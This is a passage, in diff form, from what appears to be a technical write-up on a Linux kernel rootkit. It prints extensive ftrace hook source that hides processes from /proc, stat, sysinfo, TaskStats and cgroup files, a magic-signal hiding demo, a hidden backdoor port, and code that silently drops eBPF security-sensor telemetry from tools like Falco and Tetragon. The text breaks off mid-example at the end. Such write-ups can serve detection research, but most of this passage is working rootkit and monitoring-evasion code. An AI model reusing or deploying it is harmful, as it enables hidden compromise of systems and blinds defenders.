+The sysinfo() syscall returns system information including the process
+count:
+
+struct sysinfo {
+    ...
+    unsigned short procs;  // Number of current processes
+    ...
+};
+
+sysinfo() needs its process count adjusted too:
+
+static notrace asmlinkage long hook_sysinfo(const struct pt_regs *regs)
+{
+    void __user *user_info = (void __user *)regs->di;
+    long ret;
+
+    if (!user_info || !orig_sysinfo)
+        return orig_sysinfo ? orig_sysinfo(regs) : -ENOSYS;
+
+    ret = orig_sysinfo(regs);
+    if (ret != 0)
+        return ret;
+
+    {
+        struct sysinfo kinfo;
+        if (copy_from_user(&kinfo, user_info, sizeof(kinfo)) != 0) {
+            return ret;
+        }
+
+        // Adjust process count - only subtract direct hidden count
+        {
+            int hidden_nr = hidden_pid_count();
+            if (hidden_nr > 0 && kinfo.procs > hidden_nr)
+                kinfo.procs -= hidden_nr;
+        }
+
+        copy_to_user(user_info, &kinfo, sizeof(kinfo));
+    }
+
+    return ret;
+}
+
+Only hidden_pid_count() is subtracted; descendants remain in the sysinfo
+count even when /proc omits them.
+
+
+Modern kernels have pidfd_open() to get a file descriptor for a PID:
+
+static notrace asmlinkage long hook_pidfd_open(const struct pt_regs *regs) {
+    pid_t pid = (pid_t)regs->di;
+
+    if (should_hide_pid_by_int(pid))
+        return -ESRCH;
+
+    if (!orig_pidfd_open)
+        return -ENOSYS;
+
+    return orig_pidfd_open(regs);
+}
+
+
+  --[ TaskStats Netlink Hiding
+
+TaskStats is a netlink interface for process accounting data. The main
+handler is hooked:
+
+static notrace int hook_taskstats_user_cmd(struct sk_buff *skb,
+                                           struct genl_info *info)
+{
+    pid_t pid = 0;
+
+    if (!orig_taskstats_user_cmd)
+        return -EINVAL;
+
+    if (!info)
+        return orig_taskstats_user_cmd(skb, info);
+
+    if (info->attrs) {
+        if (info->attrs[TASKSTATS_CMD_ATTR_PID]) {
+            pid = nla_get_u32(info->attrs[TASKSTATS_CMD_ATTR_PID]);
+        }
+        else if (info->attrs[TASKSTATS_CMD_ATTR_TGID]) {
+            pid = nla_get_u32(info->attrs[TASKSTATS_CMD_ATTR_TGID]);
+        }
+    }
+
+    if (pid > 0 && is_pid_hidden_ts(pid))
+        return -ESRCH;
+
+    return orig_taskstats_user_cmd(skb, info);
+}
+
+is_pid_hidden_ts() checks is_hidden_pid(), is_child_pid() and
+pid_is_thread(), so TaskStats covers direct entries, tracked descendants and
+TIDs belonging to those process groups.
+
+
+  --[ Cgroup PIDs Filtering
+
+Control groups maintain lists of PIDs in cgroup.procs files. These are in
+/sys/fs/cgroup/*/cgroup.procs.
+
+The read path does not grep a pathname string. It identifies the file from
+the live struct file:
+
+1. is_cgroup_pid_file() checks the dentry name for:
+   - cgroup.procs
+   - tasks
+   - cgroup.threads
+2. It then verifies the superblock type is cgroup or cgroup2.
+3. Once a matching file is read, filter_cgroup_pids() copies the userspace
+   buffer into kernel memory and passes it to
+       filter_hidden_pids_from_buffer().
+4. That helper parses each newline-delimited PID and removes lines whose PID
+is
+   present in hidden_pids[].
+
+The behavior is narrower than "filter anything with cgroup.procs in its
+path," and less dependent on how that path is rendered.  Only hidden_pids[]
+is checked here; a PID present solely in child_pids[] still leaks.
+
+
+  --[ Example Process-Hiding Checks
+
+The block below is a compact example of the checks discussed above.
+Start with a process to hide:
+
+    # Start a process
+    $ bash &
+    [1] 1890
+
+    # Hide it using the magic signal
+    $ kill -59 1890
+
+Then try the usual views:
+
+    $ ps aux | grep 1890
+    (no output)
+
+    $ ls /proc/ | grep 1890
+    (no output)
+
+    $ cat /proc/1890/cmdline
+    cat: /proc/1890/cmdline: No such file or directory
+
+    $ kill -0 1890
+    bash: kill: (1890) - No such process
+
+    $ pidof bash | grep 1890
+    (no output)
+
+    $ lsof -p 1890
+    lsof: no process ID specified
+
+    $ cat /sys/fs/cgroup/unified/cgroup.procs | grep 1890
+    (no output)
+
+
+============================================================================
+[0x05] - DIRECT /PROC PROBES
+============================================================================
+
+A filtered getdents buffer fools ls, not cat /proc/$pid/cmdline.  open.c
+handles that second probe for the path-based calls listed below.  It is a
+targeted patch for /proc/<pid>, not a universal filesystem veil.
+
+
+  --[ What gets caught
+
+open.c covers openat(), readlinkat(), access(), faccessat() and
+faccessat2(). The first four have IA32 paths; faccessat2() is x64-only.
+Every hook asks the same narrow question: is this an absolute /proc/<pid>
+path, and does that numeric ID belong to hidden_pids[], child_pids[], or a
+thread whose TGID is in either set? The caller's own TGID is explicitly
+allowed. Arbitrary hidden filenames are outside this helper.
+
+
+  --[ Path checks
+
+All hooks depend on is_hidden_proc_path() to validate paths:
+
+    static notrace bool is_hidden_proc_path(const char __user *pathname) {
+        char buf[PATH_BUF_SIZE];
+        long copied;
+        char pid_buf[16] = {0};
+        int i = 0, pid;
+
+        if (!pathname)
+            return false;
+
+        memset(buf, 0, PATH_BUF_SIZE);
+        copied = strncpy_from_user(buf, pathname, PATH_BUF_SIZE - 1);
+        if (copied < 0)
+            return false;
+
+        buf[PATH_BUF_SIZE - 1] = '\0';
+
+        if (strncmp(buf, "/proc/", 6) != 0)
+            return false;
+
+        const char *after = buf + 6;
+        while (i < (int)sizeof(pid_buf) - 1 &&
+               after[i] &&
+               after[i] != '/' &&
+               after[i] >= '0' && after[i] <= '9') {
+            pid_buf[i] = after[i];
+            i++;
+        }
+        pid_buf[i] = '\0';
+
+        if (i == 0)
+            return false;
+
+        if (kstrtoint(pid_buf, 10, &pid) < 0)
+            return false;
+
+        if (pid == (int)task_tgid_vnr(current))
+            return false;
+
+        return is_hidden_pid(pid) || is_child_pid(pid) || pid_is_thread(pid);
+    }
+
+The prefix must be exactly /proc/, followed by a decimal PID; anything else
+falls through. The current caller's own TGID is the explicit exception
+before the three hiding checks.
+
+
+  --[ Compat paths
+
+Linux x86_64 systems support 32-bit binaries through compatibility syscalls.
+The IA32 coverage in the hook array is:
+
+    hook_openat()      -> hook_openat32()      (ia32)
+                       -> hook_openat32_compat() (ia32 compat mode)
+    hook_readlinkat()  -> hook_readlinkat32()
+    hook_access()      -> hook_access32()
+    hook_faccessat()   -> hook_faccessat32()
+    faccessat2()       -> x64 hook only
+
+Compat calls put the pathname in different registers; the hook bodies are
+otherwise the same.  The implemented IA32 set is not universal compat
+coverage.
+
+
+From modules/open.c:
+
+    static struct ftrace_hook hooks[] = {
+        HOOK("__x64_sys_openat",         hook_openat,         &orig_openat),
+        HOOK("__ia32_sys_openat",
+             hook_openat32,
+             &orig_openat32),
+        HOOK("__ia32_compat_sys_openat",
+             hook_openat32_compat,
+             &orig_openat32_compat),
+        HOOK("__x64_sys_readlinkat",
+             hook_readlinkat,
+             &orig_readlinkat),
+        HOOK("__ia32_sys_readlinkat",
+             hook_readlinkat32,
+             &orig_readlinkat32),
+        HOOK("__x64_sys_access",         hook_access,         &orig_access),
+        HOOK("__ia32_sys_access",
+             hook_access32,
+             &orig_access32),
+        HOOK("__x64_sys_faccessat",
+             hook_faccessat,
+             &orig_faccessat),
+        HOOK("__ia32_sys_faccessat",
+             hook_faccessat32,
+             &orig_faccessat32),
+        HOOK("__x64_sys_faccessat2",
+             hook_faccessat2,
+             &orig_faccessat2),
+    };
+
+Ten hooks cover the implemented direct /proc/<pid> probes.
+
+
+  --[ Quick check
+
+    $ ls /proc | grep 1890
+    (no output)
+    $ cat /proc/1890/cmdline
+    cat: /proc/1890/cmdline: No such file or directory
+    $ readlink /proc/1890/exe
+    readlink: /proc/1890/exe: No such file or directory
+
+These examples use a directly hidden PID. The same path helper also covers
+tracked child PIDs and TIDs whose TGID is hidden or tracked as a child.
+
+
+============================================================================
+[0x06] - STAT STILL RATS YOU OUT
+============================================================================
+
+stat can query metadata without opening the file. hiding_stat.c handles the
+path-based stat family and the filename patterns used elsewhere in the tree.
+
+The path-based stat family is hooked; fstat(), which starts from an already
+open fd, is not.  The array also carries the legacy and IA32 variants.
+
+
+  --[ The stat hooks
+
+[1] statx() - Modern stat syscall
+
+    static notrace asmlinkage long hooked_sys_statx(const struct pt_regs
+        *regs) {
+        const char __user *pathname = (const char __user *)regs->si;
+        long ret;
+
+        if (should_hide_path(pathname))
+            return -ENOENT;
+
+        ret = real_sys_statx(regs);
+        if (ret != 0)
+            return ret;
+
+        adjust_user_stat_nlink(pathname, (void __user *)regs->r8, 0, true);
+        return ret;
+    }
+
+[2] newfstatat() - AT_* flag support
+
+    static notrace asmlinkage long hooked_sys_newfstatat(const struct
+        pt_regs *regs) {
+        const char __user *pathname = (const char __user *)regs->si;
+        long ret;
+
+        if (should_hide_path(pathname))
+            return -ENOENT;
+
+        ret = real_sys_newfstatat(regs);
+        if (ret != 0)
+            return ret;
+
+        adjust_user_stat_nlink(pathname, (void __user *)regs->dx,
+                               sizeof(struct stat), false);
+        return ret;
+    }
+
+[3] stat() and lstat() - Legacy syscalls
+
+    static notrace asmlinkage long hooked_sys_stat(const struct pt_regs
+        *regs) {
+        const char __user *pathname = (const char __user *)regs->di;
+        long ret;
+
+        if (should_hide_path(pathname))
+            return -ENOENT;
+
+        ret = real_sys_stat(regs);
+        if (ret != 0)
+            return ret;
+
+        adjust_user_stat_nlink(pathname, (void __user *)regs->si,
+                               sizeof(struct stat), false);
+        return ret;
+    }
+
+lstat() is hooked identically (the only difference is symlink handling in
+the kernel).
+
+
+  --[ One helper, two cases
+
+Both checks collapse into one helper:
+
+    if (should_hide_path(pathname))
+
+This filters two categories:
+
+1. hidden /proc/[pid] paths for tracked processes
+2. hidden pattern-matched file or directory names
+
+For /proc/<pid>, the helper checks hidden_pids[], child_pids[] and
+pid_is_thread(), while exempting the current caller's own TGID. For ordinary
+paths it checks the filename patterns used by the directory filter.
+
+
+static struct ftrace_hook hooks[] = {
+    HOOK("__x64_sys_statx",       hooked_sys_statx,       &real_sys_statx),
+    HOOK("__ia32_sys_statx",
+         hooked_sys_statx32,
+         &real_sys_statx32),
+    HOOK("__x64_sys_stat",        hooked_sys_stat,        &real_sys_stat),
+    HOOK("__ia32_sys_stat",       hooked_sys_stat32,      &real_sys_stat32),
+    HOOK("__x64_sys_lstat",       hooked_sys_lstat,       &real_sys_lstat),
+    HOOK("__ia32_sys_lstat",
+         hooked_sys_lstat32,
+         &real_sys_lstat32),
+    HOOK("__x64_sys_newstat",
+         hooked_sys_newstat,
+         &real_sys_newstat),
+    HOOK("__ia32_sys_newstat",
+         hooked_sys_newstat32,
+         &real_sys_newstat32),
+    HOOK("__x64_sys_newlstat",
+         hooked_sys_newlstat,
+         &real_sys_newlstat),
+    HOOK("__ia32_sys_newlstat",
+         hooked_sys_newlstat32,
+         &real_sys_newlstat32),
+    HOOK("__x64_sys_getpriority",
+         hooked_sys_getpriority,
+         &real_sys_getpriority),
+    HOOK("__ia32_sys_getpriority",
+         hooked_sys_getpriority,
+         &real_sys_getpriority32),
+    HOOK("__x64_sys_newfstatat",
+         hooked_sys_newfstatat,
+         &real_sys_newfstatat),
+    HOOK("__ia32_sys_newfstatat",
+         hooked_sys_newfstatat32,
+         &real_sys_newfstatat32),
+};
+
+Fourteen hooks cover the main stat-style paths plus IA32 compatibility for
+the implemented variants.
+
+
+  --[ fstat()
+
+fstat() starts from an existing descriptor; if the open succeeded, this
+module already allowed it and no fstat hook is installed.
+
+
+  --[ Quick check
+
+    $ stat /proc/1890
+    stat: cannot stat '/proc/1890': No such file or directory
+
+The same ENOENT applies to pattern-matched names; their metadata disappears,
+but a direct open of a known non-/proc path may still work: open.c never
+claimed that case.
+
+
+============================================================================
+[0x07] - EBPF TELEMETRY EVASION
+============================================================================
+
+BPF sensors are awkward because there is no single output pipe to grab.
+Falco, Tracee, Tetragon and private agents can leave through iterators,
+ringbuf, perf events, maps or seq output.
+
+Rejecting selected bpf() commands was easy to notice: the sensor failed and
+left -EPERM behind, while editing records on their way out leaves the
+collector running.
+
+  --[ Delivery paths
+
+bpf_hook.c targets these delivery and execution paths:
+
+  - bpf_iter_run_prog() for iterator-based enumeration
+  - bpf_ringbuf_output(), bpf_ringbuf_reserve(), bpf_ringbuf_submit()
+    for event delivery; bpf_ringbuf_reserve_dynptr() /
+    bpf_ringbuf_submit_dynptr() for the newer dynptr-based ring buffer API
+  - perf_event_output() and perf_trace_run_bpf_submit() for perf/BPF
+    telemetry
+  - bpf_map_lookup_elem(), bpf_map_update_elem(),
+    array_map_update_elem() for PID/procinfo correlation
+  - bpf_seq_write() and bpf_seq_printf() for text-oriented output
+  - trace_call_bpf() and bpf_trace_run1..bpf_trace_run12 for the
+    tracepoint-attached BPF execution path
+  - ___bpf_prog_run() for context-aware suppression at interpreter level
+    (only present when CONFIG_BPF_JIT_ALWAYS_ON is not set)
+
+
+bpf_hook_init() is best-effort: it walks the hook array, counts successful
+installs and fails only when none of them land, so missing symbols can leave
+partial coverage.
+
+
+bpf_hook.c recognizes five payload layouts:
+
+  - struct ebpf_procinfo
+  - struct ebpf_procinfo_v2
+  - struct ebpf_event_hdr
+  - struct ebpf_evt_ctx
+  - struct mon_event
+
+The layouts are only signatures for opaque buffers; once one matches, the
+hook checks task, lineage or network fields before dropping the record.
+
+The original PID is not enough; collectors also track descendants, TGIDs and
+start times to survive PID reuse.
+
+Two pieces of code account for it:
+
+1. trace.c tracks forked descendants of hidden tasks.
+2. bpf_hook.c's ordinary PID/TGID matching checks direct hidden PIDs,
+   tracked child PIDs and TIDs resolved through pid_is_thread().
+
+The NMI-safe fast path is narrower: it avoids the task lookup and scans only
+hidden_pids[] and child_pids[]. The child table caches start_time metadata
+as well as the PID.
+
+The same layouts feed several kinds of suppression:
+
+  - PID/TGID based suppression for classic procinfo records
+  - start_time_ns based suppression for PID-reuse-resistant records
+  - task-context suppression for richer runtime events
+  - path and kernel-name substring suppression for generic monitor events
+  - hidden socket suppression for the backdoor's HIDDEN_PORT
+
+
+  --[ Event Recognition Heuristics
+
+The first problem is recognizing an opaque record.
+
+From modules/bpf_hook.c:
+
+static notrace inline bool is_procinfo_event_v2(const void *data, u64 size)
+{
+    const struct ebpf_procinfo_v2 *p;
+
+    if (!data || (unsigned long)data < PAGE_SIZE)
+        return false;
+    if (size != 0 && size < EBPF_PROCINFO_V2_SIZE)
+        return false;
+
+    p = (const struct ebpf_procinfo_v2 *)data;
+    if (p->last_seen < 1000000000ULL)
+        return false;
+    if (p->start_time_ns == 0 || p->start_time_ns < 1000000000ULL)
+        return false;
+    if (p->cpu >= 4096U)
+        return false;
+
+    return true;
+}
+
+static notrace inline bool is_ebpf_event(const void *data, u64 size)
+{
+    const struct ebpf_event_hdr *h;
+    if (!data || (unsigned long)data < PAGE_SIZE) return false;
+    if (size != 0 && size < sizeof(*h)) return false;
+    h = (const struct ebpf_event_hdr *)data;
+    return h->type >= 1 && h->type <= 400 &&
+           h->len  >  0 && h->len  < 65536 &&
+           h->nparams < 20;
+}
+
+Recognition is guarded pattern matching:
+
+  - reject kernel-invalid pointers
+  - reject undersized buffers
+  - require sane timestamp-like values
+  - require sane CPU / PID / length ranges
+
+The checks are heuristics. Layout changes can break recognition, and
+unrelated records can match.
+
+Once a record is recognized, the next question is whether it belongs to a
+hidden process tree. Start time is used when possible:
+
+static notrace bool should_hide_start_time_ns(u64 start_time_ns)
+{
+    int count, i;
+
+    if (start_time_ns == 0)
+        return false;
+
+    count = READ_ONCE(hidden_count);
+    if (count > MAX_HIDDEN_PIDS)
+        count = MAX_HIDDEN_PIDS;
+
+    for (i = 0; i < count; i++) {
+        if (READ_ONCE(hidden_start_times[i]) == start_time_ns)
+            return true;
+    }
+
+    count = READ_ONCE(child_count);
+    if (count > MAX_CHILD_PIDS)
+        count = MAX_CHILD_PIDS;
+
+    for (i = 0; i < count; i++) {
+        if (READ_ONCE(child_start_times[i]) == start_time_ns)
+            return true;
+    }
+
+    return false;
+}
+
+static notrace inline bool should_suppress_procinfo(const void *data, u64
+size)
+{
+    const struct ebpf_procinfo *p;
+    u64 key;
+    u32 real_pid, real_tgid;
+
+    if (!data)
+        return false;
+
+    if (is_procinfo_event_v2(data, size))
+        return should_hide_start_time_ns(((const struct ebpf_procinfo_v2
+            *)data)->start_time_ns);
+
+    p = (const struct ebpf_procinfo *)data;
+    key = get_obf_key();
+    real_pid  = p->pid  ^ (u32)(key);
+    real_tgid = p->tgid ^ (u32)(key >> 32);
+    return should_hide_any_pid_by_int((int)real_pid) ||
+           should_hide_any_pid_by_int((int)real_tgid);
+}
+
+V2 records are matched by start_time_ns; older records fall back to
+PID/TGID, after XOR de-obfuscation when the key is known.
+
+
+  --[ Ring Buffer and Perf Buffer Suppression
+
+
+For ring buffers:
+
+  - bpf_ringbuf_reserve() returns NULL when the current task or lineage
+    should be hidden
+  - bpf_ringbuf_submit() discards records after inspecting their contents
+  - bpf_ringbuf_output() returns success-like suppression (0) for events
+    that identify hidden processes, descendants, or the hidden socket
+
+For perf/BPF delivery:
+
+  - perf_event_output() suppresses hidden raw payloads before they reach
+    user space
+  - perf_trace_run_bpf_submit() blocks delivery for hidden tasks.
+
+
+bpf_ringbuf_reserve() kills event creation before the record exists:
+
+static notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64
+flags)
+{
+    pid_t tgid, pid;
+
+    if (!orig_bpf_ringbuf_reserve) return NULL;
+
+    tgid = READ_ONCE(current->tgid);
+    pid  = READ_ONCE(current->pid);
+
+    if (in_nmi()) {
+        if (should_hide_pid_fast_nmi((int)tgid) ||
+            should_hide_pid_fast_nmi((int)pid))
+            return NULL;
+        return orig_bpf_ringbuf_reserve(ringbuf, size, flags);
+    }
+
+    if (is_child_of_hidden_process((int)tgid) ||
+        is_child_of_hidden_process((int)pid))
+        return NULL;
+
+    return orig_bpf_ringbuf_reserve(ringbuf, size, flags);
+}
+
+
+bpf_ringbuf_submit() inspects the filled record. Abridged:
+
+static notrace void hook_bpf_ringbuf_submit(void *data, u64 flags)
+{
+    const struct ebpf_event_hdr *fhdr;
+    bool suppress = false;
+
+    ...
+
+    if (is_procinfo_event_v2(data, 0) || is_procinfo_event(data)) {
+        suppress = should_suppress_procinfo(data, 0);
+    }
+
+    if (!suppress && is_ebpf_event(data, 0)) {
+        fhdr     = (const struct ebpf_event_hdr *)data;
+        suppress = is_child_of_hidden_process((int)(fhdr->tid &
+            0xFFFFFFFF));
+    }
+
+    if (suppress) {
+        safe_discard(data, flags);
+        return;
+    }
+
+    orig_bpf_ringbuf_submit(data, flags);
+}
+
+
+bpf_ringbuf_output() covers the other case: a fully prepared payload pushed
+directly. Abridged:
+
+static notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64
+size, u64 flags)
+{
+    ...
+
+    if ((size >= EBPF_PROCINFO_V2_SIZE && is_procinfo_event_v2(data, size))
+        ||
+        (size >= EBPF_PROCINFO_V1_SIZE && is_procinfo_event(data))) {
+        if (should_suppress_procinfo(data, size)) return 0;
+    }
+
+    if (is_mon_event(data, size)) {
+        if (should_suppress_mon_event(data, size)) return 0;
+    }
+
+    if (is_ebpf_event(data, size)) {
+        fhdr = (const struct ebpf_event_hdr *)data;
+        if (is_child_of_hidden_process((int)(fhdr->tid & 0xFFFFFFFF)))
+            return 0;
+    }
+
+    return orig_bpf_ringbuf_output(ringbuf, data, size, flags);
+}
+
+The return value is 0, not a hard failure.  Userland sees a successful call
+without a record.
+
+Perf delivery gets similar treatment, except the raw sample buffer has to be
+inspected. Abridged from the path:
+
+static notrace int hook_perf_event_output(struct perf_event *event,
+                                           struct perf_sample_data *data,
+                                           struct pt_regs *regs)
+{
+    ...
+
+    if (data && data->raw &&
+        (unsigned long)data->raw->frag.data > PAGE_SIZE &&
+        data->raw->frag.size >= EXT_HDR_MIN) {
+        const void *raw   = data->raw->frag.data;
+        u32         rawsz = data->raw->frag.size;
+        if (is_ext_event(raw, rawsz)) {
+            const struct ebpf_evt_ctx *ev =
+                (const struct ebpf_evt_ctx *)raw;
+            if (is_child_of_hidden_process((int)ev->task.host_pid) ||
+                is_child_of_hidden_process((int)ev->task.host_tid))
+                return 0;
+        }
+        if (is_mon_event(raw, (u64)rawsz)) {
+            if (should_suppress_mon_event(raw, (u64)rawsz))
+                return 0;
+        }
+        if (is_ebpf_event(raw, (u64)rawsz)) {
+            const struct ebpf_event_hdr *fh =
+                (const struct ebpf_event_hdr *)raw;
+            if (is_child_of_hidden_process((int)(fh->tid & 0xFFFFFFFF)))
+                return 0;
+        }
+    }
+
+    return orig_perf_event_output(event, data, regs);
+}
+
+
+  --[ Iterator and Text Output Evasion
+
+The module also targets BPF iterators and seq output.
+
+hook_bpf_iter_run_prog() examines the iterator object and suppresses two
+high-value cases:
+
+  - task iterators whose task_struct belongs to a hidden PID or descendant
+  - socket iterators whose sock_common points at the hidden address/port
+
+The module also hooks:
+
+  - bpf_seq_write()
+  - bpf_seq_printf()
+
+Some BPF tooling writes human-readable or seq-backed output instead of
+binary events; these hooks scan the first words of the payload for tracked
+PIDs.
+
+
+static notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx)
+{
+    struct bpf_iter_ctx_generic *gctx;
+    struct task_struct          *task;
+    struct sock_common          *sk;
+    pid_t                        pid, tgid;
+
+    if (!orig_bpf_iter_run_prog || !ctx) goto passthrough;
+
+    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
+        is_child_of_hidden_process((int)READ_ONCE(current->pid)))
+        return 0;
+
+    gctx = (struct bpf_iter_ctx_generic *)ctx;
+    if (!gctx->obj || (unsigned long)gctx->obj < PAGE_SIZE)
+        goto passthrough;
+
+    task = (struct task_struct *)gctx->obj;
+    if (is_valid_task_ptr_safe(task)) {
+        pid  = READ_ONCE(task->pid);
+        tgid = READ_ONCE(task->tgid);
+        if (is_child_of_hidden_process((int)pid) ||
+            is_child_of_hidden_process((int)tgid))
+            return 0;
+    }
+
+    sk = (struct sock_common *)gctx->obj;
+    if ((unsigned long)sk > PAGE_SIZE) {
+        u16 family = READ_ONCE(sk->skc_family);
+        if ((family == AF_INET || family == AF_INET6) &&
+            should_hide_socket_port(sk))
+            return 0;
+    }
+
+    return orig_bpf_iter_run_prog(prog, ctx);
+}
+
+ctx->obj is tested first as a task and then as a socket; matching tasks or
+the backdoor socket are suppressed.
+
+
+The bpf_seq_write() / bpf_seq_printf() hooks are intentionally simple:
+
+static notrace int hook_bpf_seq_write(struct seq_file *seq, const void
+*data, u32 len)
+{
+    const u32 *pd; int i;
+    if (!orig_bpf_seq_write) return -ENOSYS;
+    if (!data || len < sizeof(u32)) goto passthrough;
+    pd = (const u32 *)data;
+    for (i = 0; i < (int)(len / sizeof(u32)) && i < 16; i++) {
+        u32 v = pd[i];
+        if (v > 1 && v < PID_MAX_VALUE &&
+            should_hide_any_pid_by_int((int)v)) return 0;
+    }
+passthrough:
+    return orig_bpf_seq_write(seq, data, len);
+}
+
+This is a blunt scan over the first sixteen 32-bit words; it catches records
+that emit a PID early, at the cost of false positives and easy format drift.
+
+
+  --[ Map-Level Correlation Poisoning
+
+Event emission is only one leak. Correlation state is targeted too.
+
+bpf_map_lookup_elem(), bpf_map_update_elem(), and
+array_map_update_elem() are hooked so that PID-indexed state for hidden
+tasks either disappears (lookup => NULL) or becomes impossible to update
+reliably.
+
+There is another wrinkle: an obfuscation/config map can carry a 64-bit key.
+The hook finds it, de-obfuscates candidate telemetry fields, then decides
+whether the procinfo record belongs to a hidden process. Plain PID values
+are not required.
+
+static notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const
+void *key)
+{
+    void *ret; u32 v;
+    if (!orig_bpf_map_lookup_elem) return NULL;
+    if (is_obf_config_map(map)) return orig_bpf_map_lookup_elem(map, key);
+    ret = orig_bpf_map_lookup_elem(map, key);
+    if (ret && map && key && map->key_size == sizeof(u32)) {
+        v = *(const u32 *)key;
+        if (v > 0 && v < PID_MAX_VALUE &&
+            should_hide_any_pid_by_int((int)v))
+            return NULL;
+    }
+    return ret;
+}
+
+static notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key,
+                                              void *value, u64 flags)
+{
+    u32 v;
+    if (!orig_bpf_map_update_elem) return -ENOSYS;
+    if (is_obf_config_map(map)) return orig_bpf_map_update_elem(map, key,
+        value, flags);
+    if (map && key && map->key_size == sizeof(u32)) {
+        v = *(const u32 *)key;
+        if (v > 0 && v < PID_MAX_VALUE &&
+            should_hide_any_pid_by_int((int)v))
+            return 0;
+    }
+    return orig_bpf_map_update_elem(map, key, value, flags);
+}
+
+If a sensor keeps per-PID state in a BPF map, the hook does two things:
+
+  - make lookups for hidden PIDs come back empty
+  - pretend updates for hidden PIDs succeeded while actually dropping them
+
+
+The ARRAY-map hook handles the configuration key:
+
+static notrace int hook_array_map_update_elem(struct bpf_map *map, void
+*key,
+                                               void *value, u64 map_flags)
+{
+    void *va;
+    u64 new_key;
+    int ret;
+
+    if (!orig_array_map_update_elem) return -ENOSYS;
+    if (!map || !key || !value)
+        return orig_array_map_update_elem(map, key, value, map_flags);
+
+    if (is_obf_config_map(map) && *(const u32 *)key == 0) {
+        ret = orig_array_map_update_elem(map, key, value, map_flags);
+        if (ret == 0 && map->ops && map->ops->map_lookup_elem) {
+            va = map->ops->map_lookup_elem(map, key);
+            if (va) {
+                WRITE_ONCE(config_map_va, va);
+                new_key = READ_ONCE(*(u64 *)va);
+
+                atomic64_set(&ebpf_obf_key, (long long)new_key);
+            }
+        }
+        return ret;
+    }
+
+    return orig_array_map_update_elem(map, key, value, map_flags);
+}
+
+For the recognized configuration map, the hook stores the key for later
+procinfo decoding.
+
+
+  --[ Execution-Time Suppression
+
+The hook on `___bpf_prog_run()` is the last line. When available, if the
+current process context is hidden, the interpreter returns 0 immediately
+(with an `in_nmi()` bypass for NMI safety).
+
+
+`___bpf_prog_run` is the BPF interpreter core in `kernel/bpf/core.c`. It
+only exists when `CONFIG_BPF_JIT_ALWAYS_ON` is not set. When resolve_sym()
+returns NULL (JIT-only builds), the hook skips silently.
+
+`u32 ___bpf_prog_run(u64 *regs, const struct bpf_insn *insn)`
+
+The hook is short:
+
+static notrace u32 hook_bpf_prog_run_fn(u64 *regs, const struct bpf_insn
+*insn)
+{
+    if (!orig_bpf_prog_run_fn) return 0;
+    if (!in_nmi()) {
+        if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
+            is_child_of_hidden_process((int)READ_ONCE(current->pid)))
+            return 0;
+    }
+    return orig_bpf_prog_run_fn(regs, insn);
+}
+
+The `in_nmi()` guard matters: NMI context has a restricted stack and calling
+the hidden-pid lookup there is unsafe. Hidden processes get a zero return in
+normal context; in NMI the interpreter runs unfiltered rather than risking a
+crash.
+
+
+============================================================================
+[0x08] - IO_URING WALKS AROUND THE DOOR
+============================================================================
+
+io_uring moves work behind one submission syscall; once a sensitive fd is
+open, later I/O need not revisit the ordinary write hook.  RingReaper was
+the experiment that made this gap hard to ignore.
+
+There is no SQE parser here.  If the caller owns one of the protected fds,
+io_uring_enter() returns -EINVAL.  That stops the bypass at submission time,
+but also blocks unrelated io_uring work from the same process.
+
+
+  --[ Bypass
+
+Open tracing_on normally, queue the write through io_uring, then submit it.
+The ordinary write() hook does not see that operation; the current code
+checks for an open ftrace_enabled or tracing_on fd before allowing the
+submission.
+
+The syscall signature:
+
+    long io_uring_enter(unsigned int fd,
+                       unsigned int to_submit,
+                       unsigned int min_complete,
+                       unsigned int flags);
+
+
+  --[ The fd scan
+
+modules/hooks_write.c puts a small PID cache in front of the descriptor
+scan:
+
+static DEFINE_SPINLOCK(cache_lock);
+static pid_t last_blocked_pid = 0;
+static unsigned long last_check_jiffies = 0;
+
+static bool process_has_protected_fd(void)
+{
+    struct files_struct *files;
+    struct fdtable *fdt;
+    struct file *file;
+    unsigned int i;
+    bool has_protected = false;
+    unsigned long flags;
+
+    files = current->files;
+    if (!files)
+        return false;
+
+    spin_lock_irqsave(&files->file_lock, flags);
+
+    fdt = files_fdtable(files);
+    if (!fdt) {
+        spin_unlock_irqrestore(&files->file_lock, flags);
+        return false;
+    }
+
+    for (i = 0; i < fdt->max_fds; i++) {
+        file = fdt->fd[i];
+        if (file) {
+            if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
+                has_protected = true;
+                break;
+            }
+        }
+    }
+
+    spin_unlock_irqrestore(&files->file_lock, flags);
+    return has_protected;
+}
+
+static notrace asmlinkage long hooked_io_uring_enter(const struct pt_regs
+*regs)
+{
+    pid_t current_pid;
+    bool should_block = false;
+    unsigned long cache_flags;
+
+    if (!regs || !original_io_uring_enter)
+        return -EINVAL;
+
+    current_pid = current->pid;
+
+    spin_lock_irqsave(&cache_lock, cache_flags);
+    if (current_pid == last_blocked_pid &&
+        time_before(jiffies, last_check_jiffies + HZ)) {
+        should_block = true;
+        spin_unlock_irqrestore(&cache_lock, cache_flags);
+    } else {
+        spin_unlock_irqrestore(&cache_lock, cache_flags);
+
+        should_block = process_has_protected_fd();
+
+        if (should_block) {
+            spin_lock_irqsave(&cache_lock, cache_flags);
+            last_blocked_pid = current_pid;
+            last_check_jiffies = jiffies;
+            spin_unlock_irqrestore(&cache_lock, cache_flags);
+        }
+    }
+
+    if (should_block)
+        return -EINVAL;
+
+    return original_io_uring_enter(regs);
+}
+
+
+Checking every io_uring_enter() means walking the caller's fd table. The
+cache remembers one last_blocked_pid and a timestamp, reusing that decision
+for roughly a second. It is not a policy engine over SQEs; it is only enough
+to avoid repeating the same scan on a hot blocked caller.
+
+
+  --[ Protected Files
+
+io_uring_enter() is blocked if the process has either of these files open:
+
+1. /proc/sys/kernel/ftrace_enabled
+2. /sys/kernel/debug/tracing/tracing_on
+
+If a process has opened one of these files, all its io_uring operations are
+blocked for the duration of that condition. That prevents:
+
+    int fd = open("/sys/kernel/debug/tracing/tracing_on", O_WRONLY);
+
+    // Try to write via io_uring
+    struct io_uring ring;
+    io_uring_queue_init(8, &ring, 0);
+
+    sqe = io_uring_get_sqe(&ring);
